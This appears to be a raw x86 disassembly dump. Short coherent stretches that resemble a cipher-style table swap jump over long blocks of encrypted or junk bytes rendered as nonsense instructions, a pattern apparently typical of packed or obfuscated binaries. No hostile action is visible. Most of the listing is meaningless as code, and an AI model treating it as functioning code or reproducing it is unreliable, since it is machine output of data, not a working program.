  40c8cc:	xor    edx,eax
  40c8ce:	add    edx,DWORD PTR [ebp-0x14]
  40c8d1:	mov    edi,DWORD PTR [ebp-0x1c]
  40c8d4:	mov    dl,BYTE PTR [edx+edi*1+0x32729a]
  40c8db:	mov    BYTE PTR [ebp+0xb],dl
  40c8de:	mov    dl,BYTE PTR [ebp+0xf]
  40c8e1:	mov    edi,DWORD PTR [ebp-0xc]
  40c8e4:	xor    edi,eax
  40c8e6:	add    edi,DWORD PTR [ebp-0x14]
  40c8e9:	mov    ebx,DWORD PTR [ebp-0x1c]
  40c8ec:	mov    BYTE PTR [edi+ebx*1+0x32729a],dl
  40c8f3:	mov    dl,BYTE PTR [ebp+0xb]
  40c8f6:	mov    edi,DWORD PTR [ebp-0x18]
  40c8f9:	xor    edi,eax
  40c8fb:	add    edi,DWORD PTR [ebp-0x14]
  40c8fe:	mov    ebx,DWORD PTR [ebp-0x1c]
  40c901:	mov    BYTE PTR [edi+ebx*1+0x32729a],dl
  40c908:	mov    edx,DWORD PTR [ebp-0x44]
  40c90b:	mov    edi,DWORD PTR [ebp-0xc]
  40c90e:	xor    edx,eax
  40c910:	xor    edi,eax
  40c912:	jmp    0x40cc85
  40c917:	dec    si
  40c919:	(bad)  
  40c91a:	mov    dh,0xf7
  40c91c:	mov    cl,0x71
  40c91e:	dec    esi
  40c91f:	imul   esp,DWORD PTR [eax+0x63],0xffffff8e
  40c923:	xchg   DWORD PTR [ecx],eax
  40c925:	xchg   BYTE PTR [ebx],ah
  40c927:	ins    DWORD PTR es:[edi],dx
  40c928:	xchg   esi,eax
  40c929:	jl     0x40c9a7
  40c92b:	retf   0x7c79
  40c92e:	jl     0x40c944
  40c930:	cmp    ebp,DWORD PTR [esi]
  40c932:	push   edi
  40c933:	inc    esp
  40c934:	in     al,0x83
  40c936:	push   ebx
  40c937:	mov    edx,0xa628124a
  40c93c:	outs   dx,DWORD PTR ds:[esi]
  40c93d:	push   ebp
  40c93e:	cli    
  40c93f:	mov    es,esp
  40c941:	xor    ebp,DWORD PTR gs:[edi]
  40c944:	pop    ds
  40c945:	dec    edi
  40c946:	hlt    
  40c947:	add    BYTE PTR [ebx+edi*4],0x49
  40c94b:	sbb    BYTE PTR [edx+ecx*2+0x4eedebe1],ch
  40c952:	popf   
  40c953:	outs   dx,DWORD PTR ds:[esi]
  40c954:	fbld   TBYTE PTR [ebx]
  40c956:	mov    al,ds:0x31b48599
  40c95b:	pop    ds
  40c95c:	jecxz  0x40c9ab
  40c95e:	xchg   BYTE PTR [eax-0x45],al
  40c961:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c962:	sub    cl,bl
  40c964:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c965:	lds    ebx,FWORD PTR [ecx]
  40c967:	push   edi
  40c968:	xchg   ecx,eax
  40c969:	enter  0x8075,0xfd
  40c96d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c96e:	push   edi
  40c96f:	adc    al,0x2e
  40c971:	call   0x55a48d2
  40c976:	cdq    
  40c977:	fild   QWORD PTR [eax-0x55]
  40c97a:	jno    0x40c9b4
  40c97c:	bound  ebp,QWORD PTR [edi-0x34837f67]
  40c982:	add    DWORD PTR ds:0xabce10c0,edx
  40c988:	imul   edi,DWORD PTR [ecx+0x1e],0xda33f34
  40c98f:	jae    0x40c96c
  40c991:	(bad)  
  40c993:	and    BYTE PTR [eax],cl
  40c995:	pop    edi
  40c996:	sahf   
  40c997:	sub    DWORD PTR [ecx],edi
  40c999:	nop
  40c99a:	jp     0x40c932
  40c99c:	or     ch,BYTE PTR ds:0x2fe82fb0
  40c9a2:	jnp    0x40c9f6
  40c9a4:	xchg   edx,eax
  40c9a5:	add    ah,dh
  40c9a7:	jmp    0x5aed:0x90a1174e
  40c9ae:	pusha  
  40c9af:	pop    esp
  40c9b0:	mov    esi,ebp
  40c9b2:	test   BYTE PTR [edx+0x46],dh
  40c9b5:	jle    0x40c938
  40c9b7:	add    BYTE PTR [eax],cl
  40c9b9:	mov    esp,0x3d76a49e
  40c9be:	jns    0x40c947
  40c9c0:	mov    bl,0x7c
  40c9c2:	in     al,0xe
  40c9c4:	sbb    BYTE PTR [edi+0x673f74d2],ah
  40c9ca:	cmc    
  40c9cb:	add    ah,ch
  40c9cd:	stos   BYTE PTR es:[edi],al
  40c9ce:	pop    ebp
  40c9cf:	xchg   ebp,eax
  40c9d0:	ins    BYTE PTR es:[edi],dx
  40c9d1:	loopne 0x40c992
  40c9d3:	dec    ecx
  40c9d4:	dec    ebx
  40c9d5:	shr    DWORD PTR [edx],0x9f
  40c9d8:	int    0xe6
  40c9da:	bound  ebp,QWORD PTR ds:0xa22198a0
  40c9e0:	jmp    0x53d15016
  40c9e5:	adc    BYTE PTR [edi-0x16],ch
  40c9e8:	xor    DWORD PTR [eax+0x50],ebx
  40c9eb:	rcl    BYTE PTR ds:0x8ccaca4a,1
  40c9f1:	mov    ebp,0x6144b1e2
  40c9f6:	idiv   BYTE PTR [ebx-0x246803ac]
  40c9fc:	dec    ecx
  40c9fd:	test   al,0xf7
  40c9ff:	popf   
  40ca00:	adc    DWORD PTR [esi],eax
  40ca02:	retf   
  40ca03:	add    al,0x7d
  40ca05:	daa    
  40ca06:	or     eax,0x7be5bcb8
  40ca0b:	inc    esi
  40ca0c:	pusha  
  40ca0d:	mov    dh,0xf4
  40ca0f:	jnp    0x40ca3f
  40ca11:	call   0xf15d:0xd801dffa
  40ca18:	stos   BYTE PTR es:[edi],al
  40ca19:	sbb    dh,ch
  40ca1b:	and    ebp,DWORD PTR [edi]
  40ca1d:	outs   dx,BYTE PTR ds:[esi]
  40ca1e:	xchg   ecx,eax
  40ca1f:	mov    WORD PTR [esi-0x35a712d0],ss
  40ca25:	neg    DWORD PTR [ebx+0x13]
  40ca28:	mov    ds:0x79d3da85,eax
  40ca2d:	sbb    al,0x71
  40ca2f:	xlat   BYTE PTR ds:[ebx]
  40ca30:	in     eax,dx
  40ca31:	(bad)  [edx-0x6d63ec09]
  40ca37:	or     edx,DWORD PTR [esi]
  40ca39:	loope  0x40ca57
  40ca3b:	xchg   ebx,eax
  40ca3c:	jge    0x40ca1b
  40ca3e:	fnstcw WORD PTR [ecx-0x2be7ced5]
  40ca44:	fild   WORD PTR [esi]
  40ca46:	xlat   BYTE PTR ds:[ebx]
  40ca47:	adc    DWORD PTR [esi-0x77d7b74f],edi
  40ca4d:	or     al,0xfc
  40ca4f:	add    dh,BYTE PTR [eax+0x58]
  40ca52:	fs scas al,BYTE PTR es:[edi]
  40ca54:	loop   0x40ca78
  40ca56:	fistp  DWORD PTR ds:0x4738b830
  40ca5c:	imul   ebx,DWORD PTR [ebx],0x236f6a7d
  40ca62:	pop    ss
  40ca63:	icebp  
  40ca64:	lods   al,BYTE PTR ds:[esi]
  40ca65:	add    DWORD PTR [edi+0x758bcbd3],eax
  40ca6b:	outs   dx,DWORD PTR ds:[esi]
  40ca6c:	and    al,dl
  40ca6e:	out    0x80,eax
  40ca70:	pop    ecx
  40ca71:	out    0xf8,al
  40ca73:	and    DWORD PTR [edi],esp
  40ca75:	loop   0x40cab1
  40ca77:	xchg   esi,eax
  40ca78:	mov    dl,0x43
  40ca7a:	mov    WORD PTR [eax],?
  40ca7c:	mov    ds:0x52548b98,eax
  40ca81:	push   0x1
  40ca83:	jmp    0x40ca22
  40ca85:	scas   al,BYTE PTR es:[edi]
  40ca86:	push   edx
  40ca87:	jb     0x3eee97ee
  40ca8d:	je     0x40ca83
  40ca8f:	and    DWORD PTR [ecx+0x7468c660],edx
  40ca95:	out    0x8d,al
  40ca97:	clc    
  40ca98:	mov    ebx,0xd6060aa7
  40ca9d:	push   edi
  40ca9e:	(bad)
  40caa1:	in     eax,dx
  40caa2:	scas   al,BYTE PTR es:[edi]
  40caa3:	ret    0x560f
  40caa6:	jnp    0x40cb1c
  40caa8:	add    eax,0x6858c7db
  40caad:	mov    esp,0x8a16c06f
  40cab2:	cmc    
  40cab3:	cwde   
  40cab4:	fcom   QWORD PTR [ecx+0x12]
  40cab7:	jmp    FWORD PTR [eax]
  40cab9:	pop    ebp
  40caba:	cmp    dh,BYTE PTR [eax]
  40cabc:	dec    ebx
  40cabd:	jne    0x40cad8
  40cabf:	jp     0x40ca73
  40cac1:	or     ch,BYTE PTR [ecx]
  40cac3:	leave  
  40cac4:	call   DWORD PTR [edx+ebp*4+0x9777a19]
  40cacb:	out    dx,al
  40cacc:	jae    0x40ca67
  40cace:	repnz sti 
  40cad0:	dec    ecx
  40cad1:	ret    
  40cad2:	ficom  DWORD PTR [edx-0x156c7c97]
  40cad8:	xchg   edi,eax
  40cad9:	push   ds
  40cada:	fidivr WORD PTR [ecx-0x63]
  40cadd:	shld   DWORD PTR [ecx],ecx,cl
  40cae0:	popf   
  40cae1:	or     eax,0x1c446504
  40cae6:	sahf   
  40cae7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40cae8:	aas    
  40cae9:	inc    edi
  40caea:	icebp  
  40caeb:	mov    ebx,0xeb4c5bc2
  40caf0:	inc    edx
  40caf1:	out    dx,eax
  40caf2:	call   0x5889:0x14f0fbf0
  40caf9:	adc    dl,0x2b
  40cafc:	jne    0x40caa0
  40cafe:	pop    esi
  40caff:	daa    
  40cb00:	lods   al,BYTE PTR ds:[esi]
  40cb01:	(bad)  
  40cb02:	cs and DWORD PTR cs:[ecx-0x71469b54],ecx
  40cb0a:	(bad)  
  40cb0b:	shl    BYTE PTR [eax+0x56],0x87
  40cb0f:	dec    edx
  40cb10:	xchg   edi,eax
  40cb11:	pop    ebp
  40cb12:	pop    ebp
  40cb13:	popa   
  40cb14:	cmp    al,al
  40cb16:	push   edx
  40cb17:	or     ecx,DWORD PTR [edi]
  40cb19:	das    
  40cb1a:	push   ds
  40cb1b:	dec    ebp
  40cb1c:	add    BYTE PTR ds:0x3c424e38,cl
  40cb22:	mov    ?,WORD PTR [edi+eax*1+0x73]
  40cb26:	sub    ebp,ebx
  40cb28:	or     BYTE PTR [edi+esi*8+0x39],ah
  40cb2c:	add    edi,DWORD PTR [ebx]
  40cb2e:	fisttp QWORD PTR [eax-0x46]
  40cb31:	or     edx,DWORD PTR [edi]
  40cb33:	loope  0x40cac0
  40cb35:	xlat   BYTE PTR ds:[ebx]
  40cb36:	or     eax,0x9fdf962f
  40cb3b:	lods   al,BYTE PTR ds:[esi]
  40cb3c:	pop    esp
  40cb3d:	add    ah,dh
  40cb3f:	test   BYTE PTR [ebx],ch
  40cb41:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40cb42:	data16 aas 
  40cb44:	pop    ebx
  40cb45:	inc    edi
  40cb46:	sahf   
  40cb47:	fimul  WORD PTR [ecx+ebx*4-0x49]
  40cb4b:	into   
  40cb4c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40cb4d:	scas   al,BYTE PTR es:[edi]
  40cb4e:	push   bx
  40cb50:	jp     0x40cb65
  40cb52:	pop    ss
  40cb53:	inc    esp
  40cb54:	add    al,0x8c
  40cb56:	in     al,dx
  40cb57:	sahf   
  40cb58:	sbb    ebp,DWORD PTR [ecx+ecx*1]
  40cb5b:	add    ch,BYTE PTR [esi-0x53]
  40cb5e:	fwait
  40cb5f:	push   esp
  40cb60:	pop    ss
  40cb61:	std    
  40cb62:	cld    
  40cb63:	pop    esi
  40cb64:	jp     0x40cbd5
  40cb66:	nop
  40cb67:	mov    eax,ds:0x84ea9dd4
  40cb6c:	sahf   
  40cb6d:	int    0x24
  40cb6f:	pop    ebx
  40cb70:	mov    bl,0x34
  40cb72:	add    ah,al
  40cb74:	sbb    al,0xbc
  40cb76:	jbe    0x40cb8a
  40cb78:	push   esp
  40cb79:	sub    eax,0xde52d9aa
  40cb7e:	scas   eax,DWORD PTR es:[edi]
  40cb7f:	add    bh,BYTE PTR [ecx]
  40cb81:	dec    esp
  40cb82:	cmp    al,0x17
  40cb84:	inc    ecx
  40cb85:	ins    BYTE PTR es:[edi],dx
  40cb86:	clc    
  40cb87:	pop    ss
  40cb88:	inc    ecx
  40cb89:	add    DWORD PTR [esi-0x457c804a],0xc0b89d5c
  40cb93:	pusha  
  40cb94:	fld    QWORD PTR [edi-0x52ddf0bc]
  40cb9a:	and    eax,0x4ab07f09
  40cb9f:	pop    ebx
  40cba0:	cld    
  40cba1:	inc    ebp
  40cba2:	mov    bl,0x6c
  40cba4:	pop    ecx
  40cba5:	das    
  40cba6:	xor    ebx,DWORD PTR [eax+0x7f58c57a]
  40cbac:	xchg   esi,eax
  40cbad:	mov    cl,0xe0
  40cbaf:	dec    ebp
  40cbb0:	fndisi(8087 only) 
  40cbb2:	mov    ds:0x4ec376cc,eax
  40cbb7:	add    ch,bl
  40cbb9:	push   edx
  40cbba:	lds    ecx,FWORD PTR [esi+eiz*8+0x8]
  40cbbe:	add    eax,0x91b2feae
  40cbc3:	inc    ecx
  40cbc4:	fmul   DWORD PTR [eax]
  40cbc6:	xor    al,BYTE PTR [eax+eax*1+0x2e]
  40cbca:	jno    0x40cc2e
  40cbcc:	fstp   QWORD PTR [ebx+0x1e]
  40cbcf:	ret    
  40cbd0:	adc    eax,0x4ae1bc8e
  40cbd5:	jmp    0x66ea:0x8ff5ebcc
  40cbdc:	jecxz  0x40cb96
  40cbde:	into   
  40cbdf:	repz cmp eax,0xff69fcf6
  40cbe5:	test   DWORD PTR fs:[edi-0x80],0x415dd696
  40cbed:	mov    BYTE PTR [si],0x24
  40cbf1:	or     DWORD PTR [edx-0x54c7d06],eax
  40cbf7:	scas   al,BYTE PTR es:[edi]
  40cbf8:	xor    DWORD PTR [esi+eax*2-0x5311be14],ecx
  40cbff:	scas   eax,DWORD PTR es:[edi]
  40cc00:	inc    ebp
  40cc01:	cmp    al,0x8a
  40cc03:	mov    al,ds:0x5cf6f9e6
  40cc08:	fmul   QWORD PTR [esi-0x6f]
  40cc0b:	sub    eax,0xfc4df0f8
  40cc10:	test   BYTE PTR [edx],0x42
  40cc13:	aad    0xbd
  40cc15:	pop    ecx
  40cc16:	xchg   DWORD PTR [eax+0x13059989],eax
  40cc1c:	les    ebx,FWORD PTR [edi]
  40cc1e:	not    DWORD PTR [edx-0x5c0ef520]
  40cc24:	mov    edx,0x579aba3f
  40cc29:	push   edx
  40cc2a:	jmp    0x2772:0xcb2e37a
  40cc31:	nop
  40cc32:	jne    0x40cc7c
  40cc34:	aaa    
  40cc35:	jp     0x40cc48
  40cc37:	sbb    al,0xbf
  40cc39:	push   edi
  40cc3a:	inc    edx
  40cc3b:	sahf   
  40cc3c:	dec    ecx
  40cc3d:	mov    ds:0xe4e53da4,al
  40cc42:	or     dh,dh
  40cc44:	scas   eax,DWORD PTR es:[edi]
  40cc45:	repz fild DWORD PTR [edi]
  40cc48:	lods   eax,DWORD PTR ds:[esi]
  40cc49:	push   ebx
  40cc4a:	aaa    
  40cc4b:	std    
  40cc4c:	sub    al,0x47
  40cc4e:	push   cs
  40cc4f:	xor    al,0x5a
  40cc51:	push   cs
  40cc52:	sbb    BYTE PTR [ecx+0x67],bh
  40cc55:	shl    bl,0x3d
  40cc58:	lods   eax,DWORD PTR ds:[esi]
  40cc59:	cmc    
  40cc5a:	inc    edx
  40cc5b:	mov    edi,0x2b75227b
  40cc60:	fadd   st,st(1)
  40cc62:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40cc63:	jle    0x40cc70
  40cc65:	cmp    BYTE PTR [edx+0x75],bh
  40cc68:	fscale 
  40cc6a:	mov    ds:0x2c8e5799,eax
  40cc6f:	cli    
  40cc70:	dec    ebp
  40cc71:	sar    DWORD PTR [eax+0x57a66ae3],cl
  40cc77:	jp     0x40cc33
  40cc79:	adc    al,0x3c
  40cc7b:	or     BYTE PTR [esi+0x5c5d796a],cl
  40cc81:	nop
  40cc82:	mov    esi,0xd10311ad
  40cc87:	add    edi,ecx
  40cc89:	imul   edx,edi
  40cc8c:	add    edx,DWORD PTR [ebp-0x14]
  40cc8f:	mov    DWORD PTR [ebp-0x14],edx
  40cc92:	mov    edx,DWORD PTR [ebp-0xc]
  40cc95:	jmp    0x40d008
  40cc9a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40cc9b:	loopne 0x40cc38
  40cc9d:	mov    ebx,0xe364435b
  40cca2:	mov    ecx,DWORD PTR [esi]
  40cca4:	pop    eax
  40cca5:	push   es
  40cca6:	jo     0x40cc36
  40cca8:	je     0x40ccf0
  40ccaa:	cmp    edx,DWORD PTR [edx+0x79ca7c7c]
  40ccb0:	jl     0x40cd2e
  40ccb2:	push   esp
  40ccb3:	lock xor ebx,DWORD PTR [edi]
  40ccb6:	leave  
  40ccb7:	adc    esp,edx
  40ccb9:	ret    0x9c57
  40ccbc:	mov    ?,WORD PTR [eax-0x1e]
  40ccbf:	sbb    edx,ecx
  40ccc1:	jno    0x40cc78
  40ccc3:	mov    ecx,0xdd40a578
  40ccc8:	lods   al,BYTE PTR ds:[esi]
  40ccc9:	xchg   DWORD PTR [ebx+0x25d5b7e],esi
  40cccf:	(bad)  
  40ccd0:	dec    esp
  40ccd1:	xor    eax,0x3c9800c9
  40ccd6:	push   esp
  40ccd7:	xchg   ebx,eax
  40ccd8:	cmp    eax,0xa477ee63
  40ccdd:	je     0x40cc73
  40ccdf:	daa    
  40cce0:	or     eax,0x1d6a3866
  40cce5:	adc    al,0xca
  40cce7:	data16 sbb al,0xb4
  40ccea:	push   ebx
  40cceb:	cmp    ebx,ecx
  40cced:	jae    0x40cd21
  40ccef:	repz cmc 
  40ccf1:	mov    ah,al
  40ccf3:	add    BYTE PTR [edi-0x4e],bh
  40ccf6:	xchg   edi,eax
  40ccf7:	mov    cl,BYTE PTR [esi]
  40ccf9:	dec    DWORD PTR [esi-0x54]
  40ccfc:	inc    edi
  40ccfd:	cs jnp 0x40ccdf
  40cd00:	cmp    eax,0x4a936e53
  40cd05:	enter  0x4c1c,0x31
  40cd09:	xchg   esp,eax
  40cd0a:	xchg   edi,eax
  40cd0b:	inc    ecx
  40cd0c:	sub    DWORD PTR [ebx+esi*4],esp
  40cd0f:	rol    DWORD PTR [ebx],cl
  40cd11:	add    BYTE PTR [ecx],0xf8
  40cd14:	jecxz  0x40cd17
  40cd16:	add    eax,ebp
  40cd18:	add    cl,BYTE PTR [esi]
  40cd1a:	imul   ebx,DWORD PTR [ecx+0x22f9ec97],0xe917d870
  40cd24:	push   ebx
  40cd25:	ja     0x40cd12
  40cd27:	clc    
  40cd28:	mov    ecx,0xbfa8a8f
  40cd2d:	mov    ebx,0xca14e0cc
  40cd32:	cmp    BYTE PTR [ebx+0x59f83bf6],bl
  40cd38:	ficomp DWORD PTR [ebx-0x65c9f423]
  40cd3e:	fs fwait
  40cd40:	je     0x40cd71
  40cd42:	scas   al,BYTE PTR es:[edi]
  40cd43:	dec    ecx
  40cd44:	int    0x9a
  40cd46:	div    DWORD PTR [ebx]
  40cd48:	push   0xd9d18929
  40cd4d:	movsx  edi,WORD PTR [edi+0x39]
  40cd51:	out    0x1,al
  40cd53:	jl     0x40cd1d
  40cd55:	addr16 pop ecx
  40cd57:	cmp    DWORD PTR [edi-0x129fd369],edi
  40cd5d:	xchg   edi,eax
  40cd5e:	in     eax,dx
  40cd5f:	mov    al,0x96
  40cd61:	jo     0x40cce3
  40cd63:	popf   
  40cd64:	mov    dl,BYTE PTR [ebx+eiz*8]
  40cd67:	scas   al,BYTE PTR es:[edi]
  40cd68:	xor    al,0xa9
  40cd6a:	scas   al,BYTE PTR es:[edi]
  40cd6b:	pop    ds
  40cd6c:	dec    esi
  40cd6d:	inc    ebp
  40cd6e:	div    DWORD PTR [ecx+0x7b]
  40cd71:	mov    WORD PTR [ecx-0x46327e68],ss
  40cd77:	push   esp
  40cd78:	and    ebx,DWORD PTR [edx+edx*1+0x717a6c8f]
  40cd7f:	add    al,BYTE PTR [edi-0x3151bef9]
  40cd85:	pop    ds
  40cd86:	mov    ds:0xf027c9cc,eax
  40cd8b:	cmc    
  40cd8c:	adc    al,BYTE PTR [ebx]
  40cd8e:	mov    ah,0x3d
  40cd90:	push   cs
  40cd91:	mov    ds,WORD PTR [ebx-0x7396bdc9]
  40cd97:	neg    DWORD PTR [eax+0x15]
  40cd9a:	push   ebp
  40cd9b:	add    eax,0x690870a8
  40cda0:	sbb    al,0x74
  40cda2:	mov    bh,0x4d
  40cda4:	mov    BYTE PTR [esi-0x5c],al
  40cda7:	(bad)  
  40cda8:	cmp    BYTE PTR [ebx],al
  40cdaa:	xchg   esp,eax
  40cdab:	cmp    DWORD PTR ds:0x4a127d7f,edi
  40cdb1:	xor    al,0xf6
  40cdb3:	dec    ebp
  40cdb4:	adc    eax,esp
  40cdb6:	jnp    0x40cd89
  40cdb8:	sub    eax,0xd2a53396
  40cdbd:	or     al,0xa1
  40cdbf:	aas    
  40cdc0:	mov    edx,0xc8f12509
  40cdc5:	repz jne 0x40ce19
  40cdc8:	pop    es
  40cdc9:	dec    eax
  40cdca:	mov    dl,0x11
  40cdcc:	aaa    
  40cdcd:	dec    DWORD PTR [ebp+edx*4+0x3f]
  40cdd1:	mov    cl,0x3c
  40cdd3:	sub    ah,cl
  40cdd5:	test   eax,0x4f116327
  40cdda:	aam    0x5c
  40cddc:	xchg   ebp,eax
  40cddd:	or     eax,0x12a0ac8c
  40cde2:	cmovne ecx,DWORD PTR [esi+0x41]
  40cde6:	jmp    0x40ce64
  40cde8:	jecxz  0x40cd72
  40cdea:	loop   0x40cdda
  40cdec:	add    eax,0x44c290eb
  40cdf1:	adc    al,0x53
  40cdf3:	push   ebp
  40cdf4:	push   edi
  40cdf5:	sub    BYTE PTR [ecx-0x7ff1f40a],dh
  40cdfb:	push   cs
  40cdfc:	jmp    0x40cded
  40cdfe:	das    
  40cdff:	arpl   ax,ax
  40ce01:	xor    bh,BYTE PTR [edx-0x1bfcd6b0]
  40ce07:	aas    
  40ce08:	sub    al,0x63
  40ce0a:	neg    BYTE PTR [edx-0x7238c351]
  40ce10:	add    edi,DWORD PTR [ecx]
  40ce12:	cs mov esi,cs
  40ce15:	(bad)  
  40ce16:	adc    al,0xfb
  40ce18:	lock loope 0x40cdd3
  40ce1b:	push   ds
  40ce1c:	arpl   bx,bp
  40ce1e:	je     0x40ce77
  40ce20:	xor    eax,0x7bb7b4b9
  40ce25:	xchg   edx,eax
  40ce26:	mov    al,0x8c
  40ce28:	jp     0x40ce0b
  40ce2a:	ja     0x40ce56
  40ce2c:	stos   DWORD PTR es:[edi],eax
  40ce2d:	sbb    bh,BYTE PTR [ebp-0x62]
  40ce30:	jg     0x40ce34
  40ce32:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ce33:	shl    DWORD PTR [edi-0x11],1
  40ce36:	sbb    DWORD PTR [ebx+0x54c466a4],0x26
  40ce3d:	mov    ch,BYTE PTR [edx-0x47]
  40ce40:	mov    ds,WORD PTR [eax]
  40ce42:	xor    BYTE PTR [edi-0x3b45e005],dh
  40ce48:	or     bh,dh
  40ce4a:	dec    edx
  40ce4b:	mov    ebp,0x9c966e01
  40ce50:	or     al,0xb8
  40ce52:	(bad)  
  40ce53:	(bad)  
  40ce54:	test   eax,0xd7d7bb8e
  40ce59:	fisub  WORD PTR [ebx+0x7c]
  40ce5c:	jnp    0x40ce40
  40ce5e:	scas   al,BYTE PTR es:[edi]
  40ce5f:	inc    edx
  40ce60:	fmul   DWORD PTR [ebx+0xf6ee64b]
  40ce66:	mov    ch,0x2d
  40ce68:	adc    BYTE PTR [eax+eax*1+0x4b450ad9],dh
  40ce6f:	add    al,0x81
  40ce71:	add    al,0x7a
  40ce73:	(bad)  
  40ce74:	sbb    bl,BYTE PTR [esi+0x3717f1c8]
  40ce7a:	pop    ebp
  40ce7b:	mov    dh,0x65
  40ce7d:	inc    esp
  40ce7e:	inc    edi
  40ce7f:	std    
  40ce80:	mov    ds:0x99ffafdd,al
  40ce85:	repz loop 0x40cef2
  40ce88:	sub    cl,dh
  40ce8a:	push   edx
  40ce8b:	std    
  40ce8c:	scas   eax,DWORD PTR es:[edi]
  40ce8d:	(bad)  
  40ce8e:	std    
  40ce8f:	jmp    0xb1da0610
  40ce94:	push   eax
  40ce95:	stos   BYTE PTR es:[edi],al
  40ce96:	jne    0x40ce81
  40ce98:	jge    0x40ce31
  40ce9a:	jmp    0x5c8b:0xa06c0ac2
  40cea1:	pop    edi
  40cea2:	and    al,0xc0
  40cea4:	mov    eax,ds:0x60e1b31a
  40cea9:	inc    esp
  40ceaa:	push   ss
  40ceab:	jg     0x40ce9d
  40cead:	or     al,0x68
  40ceaf:	mov    al,ds:0x29f7720f
  40ceb4:	retf   
  40ceb5:	sbb    eax,0x8f431a7f
  40ceba:	mov    dh,0xa8
  40cebc:	stos   BYTE PTR es:[edi],al
  40cebd:	xor    al,0x2b
  40cebf:	aam    0x68
  40cec1:	add    DWORD PTR [edi],ebp
  40cec3:	sub    al,0xd5
  40cec5:	xchg   DWORD PTR [esi-0x78],esp
  40cec8:	inc    eax
  40cec9:	test   BYTE PTR [ebx-0x37],al
  40cecc:	push   ecx
  40cecd:	jle    0x40cf34
  40cecf:	mov    dl,0x22
  40ced1:	push   eax
  40ced2:	into   
  40ced3:	mov    eax,ds:0x245cffff
  40ced8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ced9:	ins    DWORD PTR es:[edi],dx
  40ceda:	je     0x40cf43
  40cedc:	push   cs
  40cedd:	xor    DWORD PTR [eax-0x579840e9],ebp
  40cee3:	cmp    ah,bh
  40cee5:	dec    ebx
  40cee6:	pop    esi
  40cee7:	lea    ecx,[esi+ebx*8+0x23]
  40ceeb:	pusha  
  40ceec:	fist   WORD PTR [edi+0x6e]
  40ceef:	jecxz  0x40cf10
  40cef1:	bound  ecx,QWORD PTR [esi+0x2c3d8e81]
  40cef7:	sub    BYTE PTR [eax+0x8811a9d],0x5e
  40cefe:	in     eax,0xed
  40cf00:	jg     0x40cef9
  40cf02:	mov    edx,0xc633cd19
  40cf07:	pop    ss
  40cf08:	ds mov esi,0x848d81a6
  40cf0e:	les    esp,FWORD PTR [ecx]
  40cf10:	fcom   st(3)
  40cf12:	inc    edi
  40cf13:	iret   
  40cf14:	push   ds
  40cf15:	or     ebx,0x5fc7c88
  40cf1b:	fiadd  DWORD PTR [ebp+0x31]
  40cf1e:	aaa    
  40cf1f:	(bad)  
  40cf21:	adc    BYTE PTR [eax+0x1c297b62],ch
  40cf27:	mov    BYTE PTR [ebp-0x47],dh
  40cf2a:	xchg   ecx,eax
  40cf2b:	add    al,0x13
  40cf2d:	xlat   BYTE PTR ds:[ebx]
  40cf2e:	and    ebp,DWORD PTR [eax]
  40cf30:	rcr    DWORD PTR [edx],1
  40cf32:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40cf33:	cmp    al,ch
  40cf35:	(bad)  
  40cf36:	adc    ah,BYTE PTR [edx-0x59]
  40cf39:	adc    cl,al
  40cf3b:	retf   0x7c8b
  40cf3e:	shl    BYTE PTR [ebx-0x54],1
  40cf41:	js     0x40cee4
  40cf43:	repnz imul edi,DWORD PTR [esi+0x7eb89d9b],0xfb5f578
  40cf4e:	or     al,0x74
  40cf50:	psraw  mm7,QWORD PTR [edx]
  40cf53:	and    al,0x51
  40cf55:	iret   
  40cf56:	sar    DWORD PTR [ebp-0x72e42203],0x48
  40cf5d:	scas   eax,DWORD PTR es:[edi]
  40cf5e:	(bad)  [ebx-0x27c47598]
  40cf64:	pusha  
  40cf65:	sub    eax,0x82b01d9e
  40cf6a:	pop    ebp
  40cf6b:	xchg   DWORD PTR [edi],esi
  40cf6d:	jge    0x40cf74
  40cf6f:	aaa    
  40cf70:	jbe    0x40cfac
  40cf72:	out    0x9d,al
  40cf74:	adc    eax,0x4dee3bce
  40cf79:	or     dh,BYTE PTR es:[ecx+0x3f]
  40cf7d:	shl    DWORD PTR [ebx+0x6e],0xea
  40cf81:	mov    eax,0x769fa10f
  40cf86:	arpl   WORD PTR es:[esi-0x51],bp
  40cf8a:	int3   
  40cf8b:	xchg   ebx,eax
  40cf8c:	xor    al,0x3
  40cf8e:	dec    ecx
  40cf8f:	or     BYTE PTR [ecx+0x39],dh
  40cf92:	dec    ecx
  40cf93:	iret   
  40cf94:	test   BYTE PTR ds:[ebx-0x4f8b6ef6],ch
  40cf9b:	and    esp,DWORD PTR [ebx-0x51359abe]
  40cfa1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40cfa2:	stos   BYTE PTR es:[edi],al
  40cfa3:	cmp    DWORD PTR ds:0x9e63aff,ebp
  40cfa9:	std    
  40cfaa:	adc    ebx,DWORD PTR [edi+0x67]
  40cfad:	sub    al,0xda
  40cfaf:	out    dx,al
  40cfb0:	add    BYTE PTR [ecx+ebx*4-0x5a0e071a],bh
  40cfb7:	xchg   al,bh
  40cfb9:	imul   esi,DWORD PTR [edx],0x5b
  40cfbc:	fmul   st,st(0)
  40cfbe:	sbb    bl,ch
  40cfc0:	popa   
  40cfc1:	shl    BYTE PTR [edi+ebp*8-0x1b4ba237],cl
  40cfc8:	ss nop
  40cfca:	mov    dl,0x58
  40cfcc:	ss and eax,0x2f6890fe
  40cfd2:	ins    BYTE PTR es:[edi],dx
  40cfd3:	sbb    ah,BYTE PTR [edx]
  40cfd5:	dec    ebp
  40cfd6:	and    ch,BYTE PTR [eax]
  40cfd8:	sub    ebx,DWORD PTR [edx]
  40cfda:	jge    0x40d040
  40cfdc:	sub    al,0x62
  40cfde:	ins    BYTE PTR es:[edi],dx
  40cfdf:	sub    al,0x90
  40cfe1:	push   0xfd79d330
  40cfe6:	add    al,0x20
